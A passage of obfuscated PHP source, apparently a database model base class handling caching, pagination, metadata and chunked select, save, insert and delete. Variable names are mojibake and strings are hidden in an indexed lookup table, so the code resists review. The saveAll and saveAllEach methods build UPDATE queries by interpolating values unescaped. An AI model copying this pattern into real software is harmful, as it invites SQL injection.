$É•‰Ê¤); return $»ñÀ¼â¸; } protected function _callBefore($¾²Ëú¹, $Ú“²) { return $this->cacheCallCheck($¾²Ëú¹, $Ú“², !1); } protected function _callAfter($íÓÈœÇÚ, $¿ÃÑä±¿) { return $this->cacheCallCheck($íÓÈœÇÚ, $¿ÃÑä±¿, !0); } protected function cacheFunctionAlias($šòŞ¿°—) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($Áé‚°Ì¡, $ÂÛş…¨Ç, $¿ëõ¦ÛÈ = false) { $ûã‡ïŸ‹ = $this->cacheFunctionAlias($ÂÛş…¨Ç); if (!$ûã‡ïŸ‹) { return; } foreach ($ûã‡ïŸ‹ as $§’¡­Œï => $í™ÇÎ×Ò) { $½³É€ = $í™ÇÎ×Ò[0]; $ŞºÍÊûé = explode($_SERVER[íû‘ş´][50], $í™ÇÎ×Ò[1]); if ($Áé‚°Ì¡ == $§’¡­Œï) { return $this->cacheFunctionGet($§’¡­Œï, $½³É€); } if ($¿ëõ¦ÛÈ && in_array($Áé‚°Ì¡, $ŞºÍÊûé)) { $this->cacheFunctionClear($§’¡­Œï, $½³É€); } } } public function cacheFunctionGet($–¬—«ıÇ, $çîÒ‰¶ñ) { $óÔ¨ª‡î = $this->cacheKeyMake($–¬—«ıÇ, $çîÒ‰¶ñ); $Á÷Ÿ‚„… = Cache::get($óÔ¨ª‡î); if (!is_array($Á÷Ÿ‚„…)) { $Á÷Ÿ‚„… = call_user_func_array(array($this, $–¬—«ıÇ), array($çîÒ‰¶ñ, !0)); Cache::set($óÔ¨ª‡î, $Á÷Ÿ‚„…); } return $Á÷Ÿ‚„…; } public function cacheFunctionClear($Ğ¸ø¨–Â, $óôïª¿×) { $º¥½·Ú = $óôïª¿×; if (!is_array($óôïª¿×)) { $º¥½·Ú = array($óôïª¿×); } foreach ($º¥½·Ú as $ã“Õ´œé) { $ô—ÀÄÊ” = $this->cacheKeyMake($Ğ¸ø¨–Â, $ã“Õ´œé); Cache::remove($ô—ÀÄÊ”); } } private function cacheKeyMake($ÄÕÀèÖ, $óÇŞáÍ‰) { $§²Ş‘Ë§ =& $_SERVER[íû‘ş´]; return get_class($this) . $§²Ş‘Ë§[11] . $ÄÕÀèÖ . $§²Ş‘Ë§[405] . $óÇŞáÍ‰; } protected function selectPageReset() { $ÅİÈªİÓ =& $_SERVER[íû‘ş´]; if (isset($GLOBALS[$ÅİÈªİÓ[406]])) { return; } $GLOBALS[$ÅİÈªİÓ[406]] = isset($GLOBALS[$ÅİÈªİÓ[7]][$ÅİÈªİÓ[407]]) ? $GLOBALS[$ÅİÈªİÓ[7]][$ÅİÈªİÓ[407]] : !1; $GLOBALS[$ÅİÈªİÓ[408]] = isset($GLOBALS[$ÅİÈªİÓ[7]][$ÅİÈªİÓ[397]]) ? $GLOBALS[$ÅİÈªİÓ[7]][$ÅİÈªİÓ[397]] : !1; $GLOBALS[$ÅİÈªİÓ[7]][$ÅİÈªİÓ[407]] = !1; $GLOBALS[$ÅİÈªİÓ[7]][$ÅİÈªİÓ[397]] = !1; } protected function selectPageRestore() { $Ğúšê´š =& $_SERVER[íû‘ş´]; if (!isset($GLOBALS[$Ğúšê´š[406]])) { return; } $GLOBALS[$Ğúšê´š[7]][$Ğúšê´š[407]] = $GLOBALS[$Ğúšê´š[406]]; $GLOBALS[$Ğúšê´š[7]][$Ğúšê´š[397]] = $GLOBALS[$Ğúšê´š[408]]; if ($GLOBALS[$Ğúšê´š[7]][$Ğúšê´š[407]] === !1) { unset($GLOBALS[$Ğúšê´š[7]][$Ğúšê´š[407]]); } if ($GLOBALS[$Ğúšê´š[7]][$Ğúšê´š[397]] === !1) { unset($GLOBALS[$Ğúšê´š[7]][$Ğúšê´š[397]]); } unset($GLOBALS[$Ğúšê´š[406]]); unset($GLOBALS[$Ğúšê´š[408]]); } protected function selectPage($ ¤ÀÜ§í = 200, $¬Ä¤áÒ× = 1) { $–ÉÏÖ–» =& $_SERVER[íû‘ş´]; global $in; $÷ÄÛ¿´Ğ = $this->optionsValue(); $ÀµÁ„Ö = 50000; $ ¤ÀÜ§í = isset($in[$–ÉÏÖ–»[407]]) && $in[$–ÉÏÖ–»[407]] ? $in[$–ÉÏÖ–»[407]] : $ ¤ÀÜ§í; if ($ ¤ÀÜ§í === -1) { $in[$–ÉÏÖ–»[407]] = !1; $ÀµÁ„Ö = 100000000; $ ¤ÀÜ§í = $ÀµÁ„Ö; } $†ç¹¤¸ë = $÷ÄÛ¿´Ğ; $†ç¹¤¸ë[$–ÉÏÖ–»[409]] = array(); $ ¤ÀÜ§í = intval($ ¤ÀÜ§í); $ ¤ÀÜ§í = $ ¤ÀÜ§í <= 5 ? 5 : ($ ¤ÀÜ§í >= $ÀµÁ„Ö ? $ÀµÁ„Ö : $ ¤ÀÜ§í); $¬Ä¤áÒ× = intval(isset($in[$–ÉÏÖ–»[397]]) && $in[$–ÉÏÖ–»[397]] ? $in[$–ÉÏÖ–»[397]] : $¬Ä¤áÒ×); $¬Ä¤áÒ× = $¬Ä¤áÒ× <= 1 ? 1 : $¬Ä¤áÒ×; $Ò¿ãíé = array(); $„áî®ÈĞ = 1; if ($¬Ä¤áÒ× == 1 && $„áî®ÈĞ) { $this->optionsValue($÷ÄÛ¿´Ğ); $Ò¿ãíé = $this->page($¬Ä¤áÒ×, $ ¤ÀÜ§í)->select(); $­ÒäÇ· = is_array($Ò¿ãíé) ? count($Ò¿ãíé) : 0; if ($­ÒäÇ· < $ ¤ÀÜ§í) { $ØƒõÓ£­ = 1; } else { $this->optionsValue($†ç¹¤¸ë); $­ÒäÇ· = intval($this->count()); $ØƒõÓ£­ = ceil($­ÒäÇ· / $ ¤ÀÜ§í); } } else { $this->optionsValue($†ç¹¤¸ë); $­ÒäÇ· = intval($this->count()); $ØƒõÓ£­ = ceil($­ÒäÇ· / $ ¤ÀÜ§í); $¬Ä¤áÒ× = $¬Ä¤áÒ× >= $ØƒõÓ£­ ? $ØƒõÓ£­ : $¬Ä¤áÒ×; $this->optionsValue($÷ÄÛ¿´Ğ); $Ò¿ãíé = $this->page($¬Ä¤áÒ×, $ ¤ÀÜ§í)->select(); } if (!is_array($Ò¿ãíé)) { $Ò¿ãíé = array(); } if ($ØƒõÓ£­ == 1) { $­ÒäÇ· = count($Ò¿ãíé); } $Â½¬˜› = array($–ÉÏÖ–»[410] => array($–ÉÏÖ–»[411] => $­ÒäÇ·, $–ÉÏÖ–»[407] => $ ¤ÀÜ§í, $–ÉÏÖ–»[397] => $¬Ä¤áÒ×, $–ÉÏÖ–»[412] => $ØƒõÓ£­), $–ÉÏÖ–»[413] => $Ò¿ãíé); return $Â½¬˜›; } protected function checkLength($¶›Ôİİ, $«Şƒ€è‡ = 0, $ü‰×îª = '') { $Ä®±à€ =& $_SERVER[íû‘ş´]; $«Şƒ€è‡ = $«Şƒ€è‡ ? $«Şƒ€è‡ : 65536; if (!$¶›Ôİİ || strlen($¶›Ôİİ) < $«Şƒ€è‡) { return; } $ü‰×îª = $ü‰×îª ? $ü‰×îª . $Ä®±à€[71] : $Ä®±à€[12]; show_json($ü‰×îª . LNG($Ä®±à€[414]) . "\x28{$«Şƒ€è‡}\51", !1); } protected function metaSet($ûá¼•Á¡, $éÛÑªİß = null, $Á–øğí = null) { $äÚ±µù =& $_SERVER[íû‘ş´]; if (!$this->tableMeta || !$ûá¼•Á¡) { return !1; } $÷ó…Åé = $this->tableMeta[$äÚ±µù[415]]; $Ğ‹˜ÌÇı = $this->tableMeta[$äÚ±µù[416]]; $±İÖó = Model($Ğ‹˜ÌÇı); $Ö´ÚèÊĞ = array($÷ó…Åé => $ûá¼•Á¡, $äÚ±µù[417] => $éÛÑªİß); if (is_null($éÛÑªİß)) { return $±İÖó->where(array($÷ó…Åé => $ûá¼•Á¡))->delete(); } if (is_null($Á–øğí) && is_string($éÛÑªİß)) { return $±İÖó->where($Ö´ÚèÊĞ)->delete(); } $‘åòöêæ = is_array($éÛÑªİß) ? $éÛÑªİß : array(); if (is_string($éÛÑªİß)) { $‘åòöêæ[$éÛÑªİß] = $Á–øğí; } $Ö‡“¼Œ = array(); foreach ($‘åòöêæ as $ìëÏô•ñ => $ª‰èşöŒ) { if (is_null($ª‰èşöŒ) && is_string($ìëÏô•ñ)) { $±İÖó->where(array($÷ó…Åé => $ûá¼•Á¡, $äÚ±µù[417] => $ìëÏô•ñ))->delete(); continue; } $this->checkLength($ª‰èşöŒ, !1, $Ğ‹˜ÌÇı . $äÚ±µù[4] . $ìëÏô•ñ); $Ö‡“¼Œ[] = array($÷ó…Åé => $ûá¼•Á¡, $äÚ±µù[94] => $ìëÏô•ñ, $äÚ±µù[418] => $ª‰èşöŒ); } $Ôü¤âË† = $äÚ±µù[419] . $Ğ‹˜ÌÇı; CacheLock::lock($Ôü¤âË†); $±İÖó->where(array($÷ó…Åé => $ûá¼•Á¡))->addAll($Ö‡“¼Œ, array(), !0); CacheLock::unlock($Ôü¤âË†); return !0; } public function metaGet($ÚîÚ¤“«, $éâë»µ = false) { $“øÎ‡ª¢ =& $_SERVER[íû‘ş´]; if (!$this->tableMeta) { return array(); } $úÊ¯Á—ç = $this->tableMeta[$“øÎ‡ª¢[415]]; $ˆŠ«ù¸ = Model($this->tableMeta[$“øÎ‡ª¢[416]]); if ($éâë»µ) { $ÀƒÍ«Ó = array($úÊ¯Á—ç => $ÚîÚ¤“«, $“øÎ‡ª¢[94] => $éâë»µ); return $ˆŠ«ù¸->where($ÀƒÍ«Ó)->getField($“øÎ‡ª¢[418]); } $ÀƒÍ«Ó = array($úÊ¯Á—ç => $ÚîÚ¤“«); $ğª©’›Ş = $ˆŠ«ù¸->field($“øÎ‡ª¢[420])->where($ÀƒÍ«Ó)->select(); $ğª©’›Ş = array_to_keyvalue($ğª©’›Ş, $“øÎ‡ª¢[94], $“øÎ‡ª¢[418]); return $ğª©’›Ş; } private function checkDataAutoHas($Óî²èš¦) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $ä„–²£) { if (in_array($Óî²èš¦, explode($_SERVER[íû‘ş´][50], $ä„–²£[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$ÍŠÀ–á¡, $æ‚û‹„) { $ÖŒÒÕ² =& $_SERVER[íû‘ş´]; if (!is_array($ÍŠÀ–á¡)) { return; } foreach ($this->dataAuto as $‚àáËÔ÷) { $¿ŞøáÙ = $‚àáËÔ÷[0]; if (!in_array($æ‚û‹„, explode($ÖŒÒÕ²[50], $‚àáËÔ÷[2]))) { continue; } switch (trim($‚àáËÔ÷[3])) { case $ÖŒÒÕ²[365]: case $ÖŒÒÕ²[366]: $àåô¯üç = $‚àáËÔ÷[1]; $ıöÒÎ¥Ö = isset($‚àáËÔ÷[4]) ? (array) $‚àáËÔ÷[4] : array(); if ($àåô¯üç == $ÖŒÒÕ²[194] && array_key_exists($¿ŞøáÙ, $ÍŠÀ–á¡)) { if (!$ÍŠÀ–á¡[$¿ŞøáÙ]) { unset($ÍŠÀ–á¡[$¿ŞøáÙ]); } break; } if (isset($ÍŠÀ–á¡[$¿ŞøáÙ])) { array_unshift($ıöÒÎ¥Ö, $ÍŠÀ–á¡[$¿ŞøáÙ]); } if ($ÖŒÒÕ²[365] == $‚àáËÔ÷[3]) { $ÍŠÀ–á¡[$¿ŞøáÙ] = call_user_func_array($àåô¯üç, $ıöÒÎ¥Ö); } else { $ÍŠÀ–á¡[$¿ŞøáÙ] = call_user_func_array(array(&$this, $àåô¯üç), $ıöÒÎ¥Ö); } break; case $ÖŒÒÕ²[314]: if (isset($ÍŠÀ–á¡[$¿ŞøáÙ]) && $ÍŠÀ–á¡[$¿ŞøáÙ]) { $ÍŠÀ–á¡[$¿ŞøáÙ] = call_user_func_array(array(&$this, $‚àáËÔ÷[1]), array($ÍŠÀ–á¡[$¿ŞøáÙ])); } break; case $ÖŒÒÕ²[317]: $ÍŠÀ–á¡[$¿ŞøáÙ] = $ÍŠÀ–á¡[$‚àáËÔ÷[1]]; break; case $ÖŒÒÕ²[338]: if (isset($ÍŠÀ–á¡[$¿ŞøáÙ]) && !is_string($ÍŠÀ–á¡[$¿ŞøáÙ])) { $ÍŠÀ–á¡[$¿ŞøáÙ] = json_encode_force($ÍŠÀ–á¡[$¿ŞøáÙ]); } break; case $ÖŒÒÕ²[367]: if ($ÍŠÀ–á¡[$¿ŞøáÙ] === $ÖŒÒÕ²[12]) { unset($ÍŠÀ–á¡[$¿ŞøáÙ]); } break; case $ÖŒÒÕ²[368]: $ÍŠÀ–á¡[$¿ŞøáÙ] = $‚àáËÔ÷[1]; default: break; } } if ($æ‚û‹„ == $ÖŒÒÕ²[399]) { $®Ú·ˆÓ¨ = strtolower($this->db->getDbType()); if (strpos($®Ú·ˆÓ¨, $ÖŒÒÕ²[13]) !== 0) { return; } $“öŞ£…Ê = $this->field(!0)->fields; $¯êÍÆ×Ú = $“öŞ£…Ê[$ÖŒÒÕ²[296]]; if (isset($“öŞ£…Ê[$ÖŒÒÕ²[295]])) { unset($¯êÍÆ×Ú[$“öŞ£…Ê[$ÖŒÒÕ²[295]]]); } foreach ($¯êÍÆ×Ú as $Ş”ïÏ©‡ => $æ‚û‹„) { if (!isset($ÍŠÀ–á¡[$Ş”ïÏ©‡])) { $ÍŠÀ–á¡[$Ş”ïÏ©‡] = $ÖŒÒÕ²[12]; } } } } private function dataAfterFilter(&$ˆĞêû») { $†©¤ÆÑï =& $_SERVER[íû‘ş´]; foreach ($this->dataAuto as $¢ŸµºÕ¹) { $ßãÊ¡‘Ÿ = $¢ŸµºÕ¹[0]; if (!isset($ˆĞêû»[$ßãÊ¡‘Ÿ])) { continue; } if (!in_array($†©¤ÆÑï[401], explode($†©¤ÆÑï[50], $¢ŸµºÕ¹[2]))) { continue; } switch (trim($¢ŸµºÕ¹[3])) { case $†©¤ÆÑï[365]: case $†©¤ÆÑï[366]: $­ÕË“š = isset($¢ŸµºÕ¹[4]) ? (array) $¢ŸµºÕ¹[4] : array(); array_unshift($­ÕË“š, $ˆĞêû»[$ßãÊ¡‘Ÿ]); if (isset($¢ŸµºÕ¹[4]) && $¢ŸµºÕ¹[4] == $†©¤ÆÑï[421]) { $­ÕË“š = array($ˆĞêû»[$ßãÊ¡‘Ÿ]); } if ($†©¤ÆÑï[365] == $¢ŸµºÕ¹[3]) { $ˆĞêû»[$ßãÊ¡‘Ÿ] = call_user_func_array($¢ŸµºÕ¹[1], $­ÕË“š); } else { $ˆĞêû»[$ßãÊ¡‘Ÿ] = call_user_func_array(array(&$this, $¢ŸµºÕ¹[1]), $­ÕË“š); } break; case $†©¤ÆÑï[314]: if (isset($ˆĞêû»[$ßãÊ¡‘Ÿ]) && $ˆĞêû»[$ßãÊ¡‘Ÿ]) { $ˆĞêû»[$ßãÊ¡‘Ÿ] = call_user_func_array(array(&$this, $¢ŸµºÕ¹[1]), array($ˆĞêû»[$ßãÊ¡‘Ÿ])); } break; case $†©¤ÆÑï[317]: $ˆĞêû»[$ßãÊ¡‘Ÿ] = $ˆĞêû»[$¢ŸµºÕ¹[1]]; break; case $†©¤ÆÑï[338]: $½Ğ¢Œ®å = $ˆĞêû»[$ßãÊ¡‘Ÿ]; $ˆĞêû»[$ßãÊ¡‘Ÿ] = json_decode($½Ğ¢Œ®å, !0); if (is_null($ˆĞêû»[$ßãÊ¡‘Ÿ])) { $ˆĞêû»[$ßãÊ¡‘Ÿ] = $½Ğ¢Œ®å; } break; case $†©¤ÆÑï[367]: if ($ˆĞêû»[$ßãÊ¡‘Ÿ] === $†©¤ÆÑï[12]) { unset($ˆĞêû»[$ßãÊ¡‘Ÿ]); } break; case $†©¤ÆÑï[368]: $ˆĞêû»[$ßãÊ¡‘Ÿ] = $¢ŸµºÕ¹[1]; break; default: break; } } } public function saveAll($ù«ó¹•©) { $¨ªŞı”‡ =& $_SERVER[íû‘ş´]; $ù³Øã = $this->tablePrefix . $this->tableName; $ˆ÷Éå– = self::SQL_WHERE_IN_CHUNK; $ù«ó¹•© = is_array($ù«ó¹•©) ? $ù«ó¹•© : array(); $èùŸÇ©‰ = $¨ªŞı”‡[422]; $‰™®ø€ = 0; $›Áñãœ = array(); $»çûÔ€ó = count($ù«ó¹•©); for ($‡·ìí¼³ = 0; $‡·ìí¼³ < $»çûÔ€ó; $‡·ìí¼³++) { $ùâ¸ÁØ = $ù«ó¹•©[$‡·ìí¼³]; if (!is_array($ùâ¸ÁØ) || count($ùâ¸ÁØ) != 4) { continue; } $Üåû–ËÓ = "\125\120\x44\101\x54\105\40\x60{$ù³Øã}\140\x20\123\105\124\40{$ùâ¸ÁØ[2]}\x20\75\40\103\101\123\x45\40{$ùâ¸ÁØ[0]}\40\12"; if ($‰™®ø€ == 0) { $èùŸÇ©‰ = $Üåû–ËÓ; } $›Áñãœ[] = $¨ªŞı”‡[118] . $ùâ¸ÁØ[1] . $¨ªŞı”‡[118]; $‰™®ø€++; $èùŸÇ©‰ .= "\x20\x57\x48\x45\x4e\40\x27{$ùâ¸ÁØ[1]}\47\x20\124\x48\x45\x4e\x20\47{$ùâ¸ÁØ[3]}\47\x20\12"; if ($‰™®ø€ == $ˆ÷Éå– || $‡·ìí¼³ == $»çûÔ€ó - 1) { $ÖÌ·¯ä = implode($¨ªŞı”‡[50], $›Áñãœ); $èùŸÇ©‰ .= "\x20\105\116\104\40\40\127\110\x45\x52\105\40{$ùâ¸ÁØ[0]}\x20\111\x4e\40\50{$ÖÌ·¯ä}\51\40"; $this->execute($èùŸÇ©‰); $‰™®ø€ = 0; $èùŸÇ©‰ = $Üåû–ËÓ; $this->chunkEventCheck(count($›Áñãœ)); $›Áñãœ = array(); } } $this->chunkEventSet(); } public function saveAllEach($ ²íáÇĞ) { $°ÃÈ»è÷ =& $_SERVER[íû‘ş´]; $³ÙäƒÄ = $this->tablePrefix . $this->tableName; foreach ($ ²íáÇĞ as $šÑ ŒÉ) { if (!is_array($šÑ ŒÉ) || count($šÑ ŒÉ) != 4) { continue; } $‚ä™Óƒ = $šÑ ŒÉ[0] . $°ÃÈ»è÷[423] . $šÑ ŒÉ[1] . $°ÃÈ»è÷[118]; $ôºÁ½ = $šÑ ŒÉ[2] . $°ÃÈ»è÷[423] . $šÑ ŒÉ[3] . $°ÃÈ»è÷[118]; $Ì¡Ú‰Â¿ = "\x75\x70\x64\x61\x74\145\40{$³ÙäƒÄ}\40\x73\145\164\x20{$ôºÁ½}\x20\x77\150\x65\x72\x65\40{$‚ä™Óƒ}\x3b"; $this->execute($Ì¡Ú‰Â¿); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($¢œ»¢È = false, $ÉÒ¶¾¥Ş = false) { $this->_chunkEvent = $¢œ»¢È; $this->_chunkEventParam = $ÉÒ¶¾¥Ş; } private function chunkEventCheck($Åşß²ı) { if (!$this->_chunkEvent) { return; } $ªÇÉÙ¼™ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $ªÇÉÙ¼™[$_SERVER[íû‘ş´][424]] = $Åşß²ı; Hook::trigger($this->_chunkEvent, $ªÇÉÙ¼™); } public function addAll($î ã¶–›, $æËÜÎ‰¤ = array(), $Çƒù¤Œ¨ = false) { $¸´„â‹Š =& $_SERVER[íû‘ş´]; ignore_timeout(); $ŒúÔ÷Ùò = self::SQL_WHERE_IN_CHUNK; if (empty($î ã¶–›)) { $this->error = think_lang($¸´„â‹Š[315]); return !1; } $æËÜÎ‰¤ = $this->_parseOptions($æËÜÎ‰¤); foreach ($î ã¶–› as $ˆ›´øİ => $ü¾©¢Ø™) { $î ã¶–›[$ˆ›´øİ] = $this->_facade($ü¾©¢Ø™); $this->_beforeInsert($î ã¶–›[$ˆ›´øİ], $æËÜÎ‰¤); } if (method_exists($this->db, $¸´„â‹Š[316])) { for ($°€‘°¹˜ = 0; $°€‘°¹˜ < count($î ã¶–›); $°€‘°¹˜ += $ŒúÔ÷Ùò) { $»«ÏïÚÂ = array_slice($î ã¶–›, $°€‘°¹˜, $ŒúÔ÷Ùò); if (!is_array($»«ÏïÚÂ) || count($»«ÏïÚÂ) == 0) { break; } $¾í¡ÔõÒ = $this->db->insertAll($»«ÏïÚÂ, $æËÜÎ‰¤, $Çƒù¤Œ¨); $this->chunkEventCheck(count($»«ÏïÚÂ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($î ã¶–› as $ˆ›´øİ => $ü¾©¢Ø™) { $¾í¡ÔõÒ = $this->db->insert($ü¾©¢Ø™, $æËÜÎ‰¤, $Çƒù¤Œ¨); } $this->commit(); } if (!1 !== $¾í¡ÔõÒ) { $„ß˜’Ô± = $this->getLastInsID(); if ($„ß˜’Ô±) { return $„ß˜’Ô±; } } return $¾í¡ÔõÒ; } public function save($å‘ËûÒ¢ = '', $Ï ²¦ëô = array()) { $™³­âª± =& $_SERVER[íû‘ş´]; $¦÷¿ÌÉú = self::SQL_WHERE_IN_CHUNK; $ª»û¨èŸ = $this->optionsValue(); $ì¿ğÂ±² = $this->findWhereField($ª»û¨èŸ); if (!$ì¿ğÂ±²) { return parent::save($å‘ËûÒ¢, $Ï ²¦ëô); } $ºı¹±–º = 0; $Ëëµä¥¨ = $ª»û¨èŸ[$™³­âª±[319]][$ì¿ğÂ±²][1]; $Ëëµä¥¨ = is_array($Ëëµä¥¨) ? $Ëëµä¥¨ : array(); $×›×…Â÷ = count($Ëëµä¥¨); for ($Ãğ£´–Ä = 0; $Ãğ£´–Ä < $×›×…Â÷; $Ãğ£´–Ä += $¦÷¿ÌÉú) { $€Ôüƒ«© = array_slice($Ëëµä¥¨, $Ãğ£´–Ä, $¦÷¿ÌÉú); if (!is_array($€Ôüƒ«©) || count($€Ôüƒ«©) == 0) { break; } $ª»û¨èŸ[$™³­âª±[319]][$ì¿ğÂ±²][1] = $€Ôüƒ«©; $this->optionsValue($ª»û¨èŸ); $ºı¹±–º += parent::save($å‘ËûÒ¢, $Ï ²¦ëô); $this->chunkEventCheck(count($€Ôüƒ«©)); } $this->chunkEventSet(); return $ºı¹±–º; } public function add($ìÑ‚éŞ† = '', $Åüú¬Õ± = array(), $¼Ø£•û = false) { if ($this->addTaskStatus && is_array($ìÑ‚éŞ†)) { $this->addTaskData[] = $ìÑ‚éŞ†; return; } return parent::add($ìÑ‚éŞ†, $Åüú¬Õ±, $¼Ø£•û); } public function parseWhereLike($­²£ ‹, $­åã»«¼ = '', $™¡´Óİ = false, &$ŠáÔø• = false) { $ØŠúÊÖé =& $_SERVER[íû‘ş´]; $Ó‚³÷™ô = $GLOBALS[$ØŠúÊÖé[6]][$ØŠúÊÖé[425]]; if (!$Ó‚³÷™ô[$ØŠúÊÖé[426]]) { return $­²£ ‹; } if (!is_array($­²£ ‹)) { return $­²£ ‹; } $ûİÊëóŒ = array(); $¶¾®ô¦ğ = 0; foreach ($­²£ ‹ as $°ÔšÕ× => $ØÉº£¢Ö) { if (is_array($ØÉº£¢Ö) && count($ØÉº£¢Ö) == 2 && $ØÉº£¢Ö[0] == $ØŠúÊÖé[427] && is_string($ØÉº£¢Ö[1]) && substr($ØÉº£¢Ö[1], 0, 1) == $ØŠúÊÖé[428] && substr($ØÉº£¢Ö[1], strlen($ØÉº£¢Ö[1]) - 1, 1) == $ØŠúÊÖé[428]) { $ŠáÔø• = !0; $Õû–ïøå = is_string($°ÔšÕ×) ? $°ÔšÕ× : $­åã»«¼; $û‡ç‘Ö = substr($ØÉº£¢Ö[1], 1, strlen($ØÉº£¢Ö[1]) - 2); $û‡ç‘Ö = $this->db->escapeString($û‡ç‘Ö); if (!strpos($Õû–ïøå, $ØŠúÊÖé[10])) { $Õû–ïøå = $ØŠúÊÖé[429] . $Õû–ïøå . $ØŠúÊÖé[429]; } $ŠÜ¼’âŸ = $ØŠúÊÖé[203] . $û‡ç‘Ö . $ØŠúÊÖé[203]; $û‡ç‘Ö = str_replace(array($ØŠúÊÖé[10], $ØŠúÊÖé[430], $ØŠúÊÖé[11]), $ØŠúÊÖé[431], $û‡ç‘Ö); if ($Ó‚³÷™ô[$ØŠúÊÖé[432]]) { $ŠÜ¼’âŸ = $ØŠúÊÖé[433] . $û‡ç‘Ö . $ØŠúÊÖé[434]; if ($Ó‚³÷™ô[$ØŠúÊÖé[435]]) { $ŠÜ¼’âŸ = $ØŠúÊÖé[434] . $û‡ç‘Ö . $ØŠúÊÖé[433]; } } $ûİÊëóŒ[$¶¾®ô¦ğ] = $ØŠúÊÖé[436] . $Õû–ïøå . $ØŠúÊÖé[437] . $ŠÜ¼’âŸ . $ØŠúÊÖé[438]; $¶¾®ô¦ğ++; continue; } if (is_array($ØÉº£¢Ö)) { $­åã»«¼ = is_string($°ÔšÕ×) ? $°ÔšÕ× : $­åã»«¼; $ØÉº£¢Ö = $this->parseWhereLike($ØÉº£¢Ö, $­åã»«¼, !0, $ŠáÔø•); } if (is_numeric($°ÔšÕ×)) { $ûİÊëóŒ[$¶¾®ô¦ğ] = $ØÉº£¢Ö; $¶¾®ô¦ğ++; } else { $ûİÊëóŒ[$°ÔšÕ×] = $ØÉº£¢Ö; } } if ($ŠáÔø• && !$™¡´Óİ) { } return $ûİÊëóŒ; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($Ãõ–’ëç = array()) { $ÊÒ—¯·‚ =& $_SERVER[íû‘ş´]; $Ã´ÖÊÅ = self::SQL_WHERE_IN_CHUNK; $ŞÖùâè¡ = $this->optionsValue(); $¾î—Ì¹‰ = $this->findWhereField($ŞÖùâè¡); if (!$¾î—Ì¹‰ || isset($ŞÖùâè¡[$ÊÒ—¯·‚[336]]) || isset($ŞÖùâè¡[$ÊÒ—¯·‚[397]])) { return parent::select($Ãõ–’ëç); } $“Óİ ±À = $ŞÖùâè¡[$ÊÒ—¯·‚[319]][$¾î—Ì¹‰][1]; $“Óİ ±À = is_array($“Óİ ±À) ? $“Óİ ±À : array(); $¾™üááˆ = null; for ($—óçÒÃ = 0; $—óçÒÃ < count($“Óİ ±À); $—óçÒÃ += $Ã´ÖÊÅ) { $¾¥Óú• = array_slice($“Óİ ±À, $—óçÒÃ, $Ã´ÖÊÅ); if (!is_array($¾¥Óú•) || count($¾¥Óú•) == 0) { break; } $ŞÖùâè¡[$ÊÒ—¯·‚[319]][$¾î—Ì¹‰][1] = $¾¥Óú•; $this->optionsValue($ŞÖùâè¡); $—ÌÎÀåÇ = parent::select($Ãõ–’ëç); if (!$—ÌÎÀåÇ) { continue; } $¾™üááˆ = is_array($¾™üááˆ) ? $¾™üááˆ : array(); $¾™üááˆ = array_merge($¾™üááˆ, $—ÌÎÀåÇ); } return $¾™üááˆ; } public function delete($¶™şÕÖë = array()) { $Ì¸‰î‰ =& $_SERVER[íû‘ş´]; $äæ—¢¦¤ = self::SQL_WHERE_IN_CHUNK; $ÃÙıË©° = $this->optionsValue(); $ÏÊû´ÌÓ = $this->findWhereField($ÃÙıË©°); if (!$ÏÊû´ÌÓ) { return parent::delete($¶™şÕÖë); } $Ñìè¹Û÷ = 0; $—”ìÂàĞ = $ÃÙıË©°[$Ì¸‰î‰[319]][$ÏÊû´ÌÓ][1]; $—”ìÂàĞ = is_array($—”ìÂàĞ) ? $—”ìÂàĞ : array(); for ($ã¼˜§»ï = 0; $ã¼˜§»ï < count($—”ìÂàĞ); $ã¼˜§»ï += $äæ—¢¦¤) { $â¹‰†ÊÄ = array_slice($—”ìÂàĞ, $ã¼˜§»ï, $äæ—¢¦¤); if (!is_array($â¹‰†ÊÄ) || count($â¹‰†ÊÄ) == 0) { break; } $ÃÙıË©°[$Ì¸‰î‰[319]][$ÏÊû´ÌÓ][1] = $â¹‰†ÊÄ; $this->optionsValue($ÃÙıË©°); $Ñìè¹Û÷ += parent::delete($¶™şÕÖë); } return $Ñìè¹Û÷; } private function findWhereField($äÔ²‘Ôü) { $ÉÆ§î¼ =& $_SERVER[íû‘ş´]; $ÜÆ‡Ì˜ = self::SQL_WHERE_IN_CHUNK; if (!is_array($äÔ²‘Ôü) || !is_array($äÔ²‘Ôü[$ÉÆ§î¼[319]])) { return !1; } foreach ($äÔ²‘Ôü[$ÉÆ§î¼[319]] as $Š¦ºïÔ× => $„¼ùŞ²õ) { if (is_array($„¼ùŞ²õ) && isset($„¼ùŞ²õ[0]) && is_string($„¼ùŞ²õ[0]) && strtolower($„¼ùŞ²õ[0]) == $ÉÆ§î¼[7] && is_array($„¼ùŞ²õ[1]) && count($„¼ùŞ²õ[1]) > $ÜÆ‡Ì˜) { ignore_timeout(); return $Š¦ºïÔ×; } } return !1; } public function setMasterDB($Ø÷”‹ßÓ = true) { think_config($_SERVER[íû‘ş´][439], $Ø÷”‹ßÓ); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\x73\x74\x65\x6d\117\160\x74\151\157\x6e"; public $field = array(); public function listData($á¶˜ô¨  = false, $¤”Ÿƒ¸‚ = "\x6d\157\x64\151\x66\x79\124\151\155\145", $¡å‘Šá¤ = false) { $âÇ÷¸Ø‡ = Model($this->modelType)->get(!1, $this->optionType, !0); $ëåõŒÈŠ = array_values($âÇ÷¸Ø‡); if ($ëåõŒÈŠ && $ëåõŒÈŠ[0] && !is_array($ëåõŒÈŠ[0])) { Model($this->modelType)->cacheRemove($this->optionType); $âÇ÷¸Ø‡ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$âÇ÷¸Ø‡) { return $á¶˜ô¨  ? null : array(); } if (!$á¶˜ô¨ ) { $âÇ÷¸Ø‡ = array_filter(array_values($âÇ÷¸Ø‡)); 